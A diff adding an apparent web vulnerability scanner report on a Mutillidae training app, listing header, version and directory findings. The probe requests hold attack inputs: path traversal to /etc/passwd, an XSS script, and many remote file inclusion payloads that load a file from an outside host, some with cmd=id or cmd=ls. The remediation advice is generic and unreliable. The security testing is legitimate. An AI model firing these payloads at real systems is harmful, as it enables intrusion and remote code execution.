@@ -1,0 +1,1318 @@
+Vulnix Deep Web Report - Target: http://192.168.78.102/mutillidae
+Date: Wed Jan 14 11:51:23 AM EST 2026
+-----------------------------------------------------------------
+-----------------------------------------------------------------
+[MEDIUM  ] Nmap Script: http-methods
+Evidence:
+
+  Supported Methods: GET HEAD POST OPTIONS
+Remediation: Review web server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Nmap Script: http-headers
+Evidence:
+
+  Date: Wed, 14 Jan 2026 16:25:30 GMT
+  Server: Apache/2.2.8 (Ubuntu) DAV/2
+  X-Powered-By: PHP/5.2.4-2ubuntu5.10
+  Connection: close
+  Content-Type: text/html
+  
+  (Request type: HEAD)
+
+Remediation: Review web server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Nmap Script: http-server-header
+Evidence:
+Apache/2.2.8 (Ubuntu) DAV/2
+Remediation: Review web server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Apache/2...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Apache/2.2.8 (Ubuntu) DAV/2
+Method: 
+Details: Apache/2.2.8 (Ubuntu) DAV/2
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Cookie PHPSESSID created without the httponly flag...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Cookie PHPSESSID created without the httponly flag.
+Method: /mutillidae/
+Details: Cookie PHPSESSID created without the httponly flag.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Retrieved x-powered-by header: PHP/5...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+Method: /mutillidae/
+Details: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] The anti-clickjacking X-Frame-Options header is not present...
+Evidence:
+URL: http://192.168.78.102/mutillidae/The anti-clickjacking X-Frame-Options header is not present.
+Method: /mutillidae/
+Details: The anti-clickjacking X-Frame-Options header is not present.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Uncommon header 'logged-in-user' found, with contents: ...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Uncommon header 'logged-in-user' found, with contents: .
+Method: /mutillidae/
+Details: Uncommon header 'logged-in-user' found, with contents: .
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] The X-Content-Type-Options header is not set...
+Evidence:
+URL: http://192.168.78.102/mutillidae/The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+Method: /mutillidae/
+Details: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Server may leak inodes via ETags, header found with file /mu...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Server may leak inodes via ETags, header found with file /mutillidae/robots.txt, inode: 92442, size: 160, mtime: Tue May 10 17:00:04 2011.
+Method: /mutillidae/robots.txt
+Details: Server may leak inodes via ETags, header found with file /mutillidae/robots.txt, inode: 92442, size: 160, mtime: Tue May 10 17:00:04 2011.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /robots...
+Evidence:
+URL: http://192.168.78.102/mutillidae/robots.txt: contains 6 entries which should be manually viewed.
+Method: /mutillidae/robots.txt
+Details: /robots.txt: contains 6 entries which should be manually viewed.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[MEDIUM  ] Uncommon header 'tcn' found, with contents: list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Uncommon header 'tcn' found, with contents: list.
+Method: /mutillidae/index
+Details: Uncommon header 'tcn' found, with contents: list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /index: Apache mod_negotiation is enabled with MultiViews, w...
+Evidence:
+URL: http://192.168.78.102/mutillidae/index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php.
+Method: /mutillidae/index
+Details: /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Apache/2...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+Method: /mutillidae/
+Details: Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRA...
+Evidence:
+URL: http://192.168.78.102/mutillidae/OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+Method: /mutillidae/
+Details: OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /: Web Server returns a valid response with junk HTTP method...
+Evidence:
+URL: http://192.168.78.102/mutillidae/: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+Method: /mutillidae/
+Details: /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /: HTTP TRACE method is active which suggests the host is vu...
+Evidence:
+URL: http://192.168.78.102/mutillidae/: HTTP TRACE method is active which suggests the host is vulnerable to XST.
+Method: /mutillidae/
+Details: /: HTTP TRACE method is active which suggests the host is vulnerable to XST.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] phpMyAdmin allows directory listings remotely...
+Evidence:
+URL: http://192.168.78.102/mutillidae/phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.
+Method: /mutillidae/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
+Details: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] The PHP-Nuke Rocket add-in is vulnerable to file traversal, ...
+Evidence:
+URL: http://192.168.78.102/mutillidae/The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+Method: /mutillidae/index.php?page=../../../../../../../../../../etc/passwd
+Details: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /mutillidae/index...
+Evidence:
+URL: http://192.168.78.102/mutillidae/mutillidae/index.php: PHP include error may indicate local or remote file inclusion is possible.
+Method: /mutillidae/index.php?page=../../../../../../../../../../boot.ini
+Details: /mutillidae/index.php: PHP include error may indicate local or remote file inclusion is possible.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] /mutillidae/phpinfo...
+Evidence:
+URL: http://192.168.78.102/mutillidae/mutillidae/phpinfo.php: Output from the phpinfo() function was found.
+Method: /mutillidae/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
+Details: /mutillidae/phpinfo.php: Output from the phpinfo() function was found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP reveals potentially sensitive information via certain HT...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Method: /mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+Details: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP reveals potentially sensitive information via certain HT...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Method: /mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
+Details: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP reveals potentially sensitive information via certain HT...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Method: /mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
+Details: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP reveals potentially sensitive information via certain HT...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Method: /mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42
+Details: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] This might be interesting...
+Evidence:
+URL: http://192.168.78.102/mutillidae/This might be interesting.
+Method: /mutillidae/home/
+Details: This might be interesting.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Directory indexing found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Directory indexing found.
+Method: /mutillidae/includes/
+Details: Directory indexing found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] This might be interesting...
+Evidence:
+URL: http://192.168.78.102/mutillidae/This might be interesting.
+Method: /mutillidae/includes/
+Details: This might be interesting.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] This might be interesting...
+Evidence:
+URL: http://192.168.78.102/mutillidae/This might be interesting.
+Method: /mutillidae/login/
+Details: This might be interesting.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Directory indexing found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Directory indexing found.
+Method: /mutillidae/passwords/
+Details: Directory indexing found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] This might be interesting...
+Evidence:
+URL: http://192.168.78.102/mutillidae/This might be interesting.
+Method: /mutillidae/passwords/
+Details: This might be interesting.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] This might be interesting...
+Evidence:
+URL: http://192.168.78.102/mutillidae/This might be interesting.
+Method: /mutillidae/register/
+Details: This might be interesting.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP is installed, and a test script which runs phpinfo() was...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+Method: /mutillidae/phpinfo.php
+Details: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] PHP is installed, and a test script which runs phpinfo() was...
+Evidence:
+URL: http://192.168.78.102/mutillidae/PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+Method: /mutillidae/index.php
+Details: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Directory indexing found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Directory indexing found.
+Method: /mutillidae/images/
+Details: Directory indexing found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Directory indexing found...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Directory indexing found.
+Method: /mutillidae/styles/
+Details: Directory indexing found.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] DotBr 0...
+Evidence:
+URL: http://192.168.78.102/mutillidae/DotBr 0.1 configuration file includes usernames and passwords.
+Method: /mutillidae/config.inc
+Details: DotBr 0.1 configuration file includes usernames and passwords.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/?_CONFIG[files][functions_page]=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/?npage=-1&content_dir=http://blog.cirt.net/rfiinc.txt%00&cmd=ls
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/?npage=1&content_dir=http://blog.cirt.net/rfiinc.txt%00&cmd=ls
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/?show=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?1=lol&PAGES[lol]=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?AML_opensite=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?AMV_openconfig=1&AMV_serverpath=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?CONFIG[MWCHAT_Libs]=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?ConfigDir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?DIR_PLUGINS=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?G_JGALL[inc_path]=http://blog.cirt.net/rfiinc.txt%00
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?HomeDir=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?Lang=AR&Page=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?Madoa=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?RP_PATH=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?abg_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?abs_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?abs_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?adduser=true&lang=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?adodb=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?ads_file=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?arquivo=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?back=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?base==http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?basePath=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?bibtexrootrel=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?blog_dc_path=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?blog_theme=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?body=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?class_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?classified_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?cms=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?config[\sipssys\"]=http://blog.cirt.net/rfiinc.txt"
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?&cmd=id
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?cmd=id
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?config_atkroot=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?configuration=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?custom_admin_path=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?dateiPfad=http://blog.cirt.net/rfiinc.txt?&cmd=ls
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?de=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?dept=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?do=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?exec=http://blog.cirt.net/rfiinc.txt?
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?ext=http://blog.cirt.net/rfiinc.txt
+Details: Remote File Inclusion (RFI) from RSnake's RFI list.
+Remediation: Check server configuration.
+
+-----------------------------------------------------------------
+[LOW     ] Remote File Inclusion (RFI) from RSnake's RFI list...
+Evidence:
+URL: http://192.168.78.102/mutillidae/Remote File Inclusion (RFI) from RSnake's RFI list.
+Method: /mutillidae/index.php?faq_path=http://blog.cirt.net/rfiinc.txt?&cmd=id
